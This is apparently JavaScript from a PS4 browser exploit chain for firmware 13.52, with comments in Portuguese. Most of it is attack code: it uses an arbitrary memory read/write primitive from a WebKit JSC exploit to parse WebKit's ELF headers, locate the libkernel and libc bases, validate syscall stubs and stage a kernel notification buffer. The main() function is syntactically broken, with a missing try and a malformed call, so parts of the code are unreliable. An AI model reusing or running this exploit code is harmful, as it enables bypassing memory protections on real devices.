// ═════════════════════════════════════════════════════════════════════════════
// RESOLUÇÃO DINÂMICA DE BASES VIA PARSING ELF (CORRIGIDO: endereços absolutos)
// ═════════════════════════════════════════════════════════════════════════════

async function resolveAllBases(p, webkitBase) {
  logH('PARSING ELF DO WEBKIT (v2 - corrigido)');

  // ─── Passo 1: Verificar ELF magic ───
  let magic = p.read32(webkitBase);
  if (magic !== 0x464C457F) {
    log('[-] WebKit base não aponta para ELF válido! magic=0x' + magic.toString(16), 'e');
    return null;
  }
  log('[+] ELF magic válido (\x7fELF)');

  // ─── Passo 2: Ler program headers ───
  // ehdr.e_phoff  = offset 0x20 (8 bytes)
  // ehdr.e_phnum  = offset 0x38 (2 bytes)
  let phoff_raw = p.read64(webkitBase.add32(0x20));
  let phnum     = p.read16(webkitBase.add32(0x38));

  // phoff é offset dentro do arquivo → endereço absoluto = webkitBase + phoff
  let phoff = webkitBase.add32(phoff_raw.low);
  log('[+] Program headers: ' + phnum + ' entries, abs=0x' + phoff.toString(16));

  // ─── Passo 3: Encontrar PT_DYNAMIC ───
  let dynamicVaddr_abs = null;
  let dynamicSize = 0;

  for (let i = 0; i < phnum; i++) {
    let phAddr = phoff.add32(i * 0x38);
    let p_type = p.read32(phAddr);
    if (p_type === 2) { // PT_DYNAMIC
      // phdr[0x10] = p_vaddr (offset relativo ao base de carregamento)
      let p_vaddr_rel = p.read64(phAddr.add32(0x10));
      // phdr[0x28] = p_filesz (tamanho da seção dynamic)
      dynamicSize  = p.read64(phAddr.add32(0x28)).low;
      // CONVERTER PARA ABSOLUTO: webkitBase + p_vaddr
      dynamicVaddr_abs = webkitBase.add32(p_vaddr_rel.low);
      log('[+] PT_DYNAMIC: rel=0x' + p_vaddr_rel.toString(16) +
          ' abs=0x' + dynamicVaddr_abs.toString(16) +
          ' size=0x' + dynamicSize.toString(16));
      break;
    }
  }

  if (!dynamicVaddr_abs) {
    log('[-] PT_DYNAMIC não encontrado', 'e');
    return null;
  }

  // ─── Passo 4: Parsear entradas dynamic ───
  // IMPORTANTE: todos os valores do dynamic section são offsets relativos
  // ao base de carregamento do módulo (p_vaddr style), exceto quando
  // explicitamente marcados como absolutos (raramente no PS4).
  let strtab_abs = null, symtab_abs = null, jmprel_abs = null, pltrelsz = 0;

  for (let off = 0; off < dynamicSize; off += 16) {
    let entry = dynamicVaddr_abs.add32(off);
    let tag = p.read64(entry).low;
    let val_raw = p.read64(entry.add32(8));

    if (tag === 5)  strtab_abs = webkitBase.add32(val_raw.low);  // DT_STRTAB
    if (tag === 6)  symtab_abs = webkitBase.add32(val_raw.low);  // DT_SYMTAB
    if (tag === 23) jmprel_abs = webkitBase.add32(val_raw.low);  // DT_JMPREL
    if (tag === 2)  pltrelsz   = val_raw.low;                    // DT_PLTRELSZ
    if (tag === 0)  break;                                       // DT_NULL
  }

  log('[+] strtab_abs=0x' + (strtab_abs ? strtab_abs.toString(16) : 'null'));
  log('[+] symtab_abs=0x' + (symtab_abs ? symtab_abs.toString(16) : 'null'));
  log('[+] jmprel_abs=0x' + (jmprel_abs ? jmprel_abs.toString(16) : 'null') + ' pltrelsz=' + pltrelsz);

  if (!strtab_abs || !symtab_abs || !jmprel_abs) {
    log('[-] Seção dynamic incompleta', 'e');
    return null;
  }

  // ─── Passo 5: Varredura de imports ───
  let imports = {};
  let numRela = Math.floor(pltrelsz / 24);
  log('[+] Varrendo ' + numRela + ' entradas RELA...');

  for (let i = 0; i < numRela; i++) {
    let rela = jmprel_abs.add32(i * 24);
    // rela[0x00] = r_offset (relativo ao módulo → precisa converter)
    let r_offset_rel = p.read64(rela);
    // rela[0x08] = r_info (symIdx nos 32 bits altos)
    let r_info   = p.read64(rela.add32(8)).low;
    let symIdx   = (r_info >>> 32) & 0xFFFFFFFF;

    // CONVERTER r_offset para absoluto
    let r_offset_abs = webkitBase.add32(r_offset_rel.low);

    // symtab[symIdx].st_name = offset na string table
    let st_name = p.read32(symtab_abs.add32(symIdx * 24));
    let strAddr = strtab_abs.add32(st_name);

    let name = '';
    for (let j = 0; j < 256; j++) {
      let ch = p.read8(strAddr.add32(j));
      if (ch === 0) break;
      name += String.fromCharCode(ch);
    }

    if (name.length > 0) {
      // wkOffset = offset relativo puro (para referência)
      let wkOffset = r_offset_rel;
      // importPtr = o que está escrito no slot de import (ponteiro resolvido)
      let importPtr = p.read8(r_offset_abs);

      imports[name] = { wkOffset, importPtr, r_offset_abs };
    }
  }
  log('[+] ' + Object.keys(imports).length + ' imports parseados');

  // ─── Passo 6: Logar imports úteis ───
  let useful = ['memset','memcpy','strcmp','strlen','pthread_create',
                '__stack_chk_guard','sceKernelDlsym','sceKernelSendNotificationRequest',
                'sceKernelGetpid','sceKernelUsleep'];
  for (let name of useful) {
    if (imports[name]) {
      let ip = imports[name].importPtr;
      let wo = imports[name].wkOffset;
      let isSys = (ip.hi >= 0x80 && ip.hi <= 0x9F);
      log('    ' + name + ': wkOff=0x' + wo.toString(16) +
          ' ptr=0x' + ip.toString(16) +
          ' sysRange=' + isSys, isSys ? 'd' : 'w');
    }
  }

  // ─── Passo 7: Encontrar bases varrendo para trás ───
  let libkernelBase = null;
  let libcBase = null;

  function findElfBase(p, startPtr, maxBack) {
    // startPtr deve ser um endereço absoluto válido dentro de um módulo
    for (let back = 0; back < maxBack; back += 0x1000) {
      try {
        let test = startPtr.sub32(back);
        if (p.read32(test) === 0x464C457F) {
          return test;
        }
      } catch(e) {}
    }
    return null;
  }

  // libkernel: usar __stack_chk_guard ou sceKernelGetpid ou sceKernelUsleep
  let lkRef = imports['__stack_chk_guard'] || imports['sceKernelGetpid'] || imports['sceKernelUsleep'];
  if (lkRef) {
    let ptr = lkRef.importPtr;
    // Validar se o ponteiro parece um endereço de módulo
    if (ptr.hi >= 0x80 && ptr.hi <= 0x9F) {
      libkernelBase = findElfBase(p, ptr, 0x200000);
      if (libkernelBase) {
        log('[+] libkernel base encontrada: 0x' + libkernelBase.toString(16), 'ok');
        setCard('c-lk', '0x' + libkernelBase.toString(16));
      } else {
        log('[-] Não foi possível encontrar base da libkernel (scan falhou)', 'w');
      }
    } else {
      log('[-] Import da libkernel aponta para endereço inválido: 0x' + ptr.toString(16), 'w');
      log('    Isso indica que a tabela RELA pode não conter imports SCE padrão.', 'w');
    }
  }

  // libc: usar memset
  if (imports['memset']) {
    let ptr = imports['memset'].importPtr;
    if (ptr.hi >= 0x80 && ptr.hi <= 0x9F) {
      libcBase = findElfBase(p, ptr, 0x200000);
      if (libcBase) {
        log('[+] libc base encontrada: 0x' + libcBase.toString(16), 'ok');
        setCard('c-lc', '0x' + libcBase.toString(16));
      } else {
        log('[-] Não foi possível encontrar base da libc (scan falhou)', 'w');
      }
    } else {
      log('[-] Import do memset aponta para endereço inválido: 0x' + ptr.toString(16), 'w');
    }
  }

  return { imports, libkernelBase, libcBase };
}

// ═════════════════════════════════════════════════════════════════════════════
// VALIDAÇÃO DE BASES
// ═════════════════════════════════════════════════════════════════════════════

async function validateBases(p, libkernelBase, libcBase, imports) {
  logH('VALIDANDO BASES');
  let valid = { libkernel: false, libc: false };

  // ─── Teste 1: ELF magic na base ───
  if (libkernelBase) {
    let magic = p.read32(libkernelBase);
    if (magic === 0x464C457F) {
      log('[✓] libkernel: ELF magic válido', 'ok');
      valid.libkernel = true;
    } else {
      log('[✗] libkernel: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
    }
  }

  if (libcBase) {
    let magic = p.read32(libcBase);
    if (magic === 0x464C457F) {
      log('[✓] libc: ELF magic válido', 'ok');
      valid.libc = true;
    } else {
      log('[✗] libc: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
    }
  }

  // ─── Teste 2: Assinatura de stub de syscall ───
  if (libkernelBase && valid.libkernel) {
    let foundStubs = 0;
    for (let off = 0; off < 0x100000; off += 0x10) {
      try {
        let b0 = p.read8(libkernelBase.add32(off));
        let b1 = p.read8(libkernelBase.add32(off + 1));
        let b2 = p.read8(libkernelBase.add32(off + 2));
        if (b0 === 0x48 && b1 === 0xC7 && b2 === 0xC0) {
          let b7 = p.read8(libkernelBase.add32(off + 7));
          let b8 = p.read8(libkernelBase.add32(off + 8));
          let b9 = p.read8(libkernelBase.add32(off + 9));
          if (b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
            foundStubs++;
            if (foundStubs >= 3) break;
          }
        }
      } catch(e) {}
    }
    if (foundStubs >= 3) {
      log('[✓] libkernel: ' + foundStubs + ' stubs de syscall encontrados', 'ok');
    } else {
      log('[✗] libkernel: poucos stubs de syscall (' + foundStubs + ')', 'w');
      valid.libkernel = false;
    }
  }

  // ─── Teste 3: Verificar se memset aponta para código válido ───
  if (imports && imports['memset'] && libcBase && valid.libc) {
    let memsetPtr = imports['memset'].importPtr;
    let b0 = p.read8(memsetPtr);
    if (b0 !== 0x00 && b0 !== 0xCC && b0 !== 0xFF) {
      log('[✓] libc: memset aponta para código válido (0x' + b0.toString(16) + ')', 'ok');
    } else {
      log('[✗] libc: memset aponta para código suspeito (0x' + b0.toString(16) + ')', 'w');
    }
  }

  // ─── Teste 4: Verificar consistência de page alignment ───
  if (libkernelBase) {
    let aligned = (libkernelBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libkernel: alinhada a página (0x1000)' : '[✗] libkernel: NÃO alinhada a página', aligned ? 'ok' : 'w');
    if (!aligned) valid.libkernel = false;
  }
  if (libcBase) {
    let aligned = (libcBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libc: alinhada a página (0x1000)' : '[✗] libc: NÃO alinhada a página', aligned ? 'ok' : 'w');
    if (!aligned) valid.libc = false;
  }

  return valid;
}

// ═════════════════════════════════════════════════════════════════════════════
// PREPARAÇÃO DO BUFFER DE NOTIFICAÇÃO
// ═════════════════════════════════════════════════════════════════════════════

function prepareNotification(p, libkernelBase, imports, text) {
  logH('PREPARANDO BUFFER DE NOTIFICAÇÃO');

  let notifyImport = imports['sceKernelSendNotificationRequest'];
  if (!notifyImport) {
    log('[-] sceKernelSendNotificationRequest não encontrado nos imports!', 'e');
    return null;
  }

  let notifyFunc = notifyImport.importPtr;
  log('[+] Endereço alvo da API: 0x' + notifyFunc.toString(16));

  let encoder = new TextEncoder();
  let msgBytes = encoder.encode(text + '\x00');

  let buf = new Uint8Array(0x400);
  buf[4] = 0;
  buf.set(msgBytes, 0x20);

  let arrCell = p.leakval(buf);
  let backingStore = p.read8(arrCell.add32(0x10));

  p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
  p.write4(backingStore.add32(0x10), msgBytes.length);

  log('[+] Buffer alocado com sucesso em: 0x' + backingStore.toString(16), 'ok');

  return { notifyFunc, requestBuffer: backingStore };
}

// ═════════════════════════════════════════════════════════════════════════════

// ═════════════════════════════════════════════════════════════════════════════

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;

  let carrier;

    carrier = await establishPrimitive({

        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + tag.toLowerCase();

      },

    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: exploit JSC concluído!', 'ok');
  setStatus('Instalando R/W arbitrário...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => {
        log(`  [mem/${tag}] ${detail}`, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
  setStatus('Mapeando bases com estabilidade...', 'r');
  logH('MAPEAMENTO DA 13.52 (v2)');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(16), 'a');

    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
               ? OFFSET_wk_host_constructor_candidates[0]
               : 0x36F9E20;

    const resolvedBaseVal = ctor - hc;
    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
    setCard('c-wk', '0x' + webkitBase.toString(16));

    setTimeout(async () => {
      const result = await resolveAllBases(p, webkitBase);
      if (!result) {
        setStatus('Falha na resolução de bases', 'e');
        return;
      }

      const imports = result.imports;
      const libKernelBase = result.libkernelBase;
      const libcBase = result.libcBase;

      const valid = await validateBases(p, libKernelBase, libcBase, imports);

      if (!valid.libkernel) {
        setCard('c-lk', 'Falha na validação');
        log('[-] libkernel base não passou na validação', 'e');
      }
      if (!valid.libc) {
        setCard('c-lc', 'Falha na validação');
        log('[-] libc base não passou na validação', 'e');
      }

      if (valid.libkernel) {
        try {
          const notif = prepareNotification(p, libKernelBase, imports, 'Hello World from PS4 13.52!');
          if (notif) {
            setCard('c-g', 'Pronto');
            setStatus('Buffer de notificação pronto!', 'ok');
            log('[✓] Configuração de notificação concluída com sucesso.', 'ok');

            const cbox = document.getElementById('cbox');
            cbox.style.display = 'block';
            document.getElementById('c-out').textContent =
                'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
                'libkernel Base  = 0x' + (libKernelBase ? libKernelBase.toString(16) : 'N/A') + '\n' +
                'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
                'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
                'Função Target   = 0x' + notif.notifyFunc.toString(16) + '\n' +
                'Notify Offset   = 0x' + (imports['sceKernelSendNotificationRequest'] ? imports['sceKernelSendNotificationRequest'].wkOffset.toString(16) : 'N/A');

            logH('NOTIFICAÇÃO');
            log('[+] Offset dinâmico de sceKernelSendNotificationRequest: 0x' + imports['sceKernelSendNotificationRequest'].wkOffset.toString(16), 'i');
            log('[!] Execução nativa requer ROP chain ou JIT pivot (não implementado)', 'w');
            log('[!] Status: userland R/W ativo. Kernel exploit necessário para execução real.', 'w');

          } else {
            setCard('c-g', 'Falha');
            log('[-] Falha ao preparar buffer de notificação', 'e');
          }
        } catch (e) {
          log('[-] Erro ao preparar buffer: ' + e.message, 'e');
        }
      } else {
        setCard('c-g', 'Falha LK');
        log('[-] Não foi possível resolver a libkernel para o buffer.', 'e');
      }
    }, 1000);

  } else {
    log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
    setStatus('Erro ao capturar NativeCtor', 'e');
  }
}
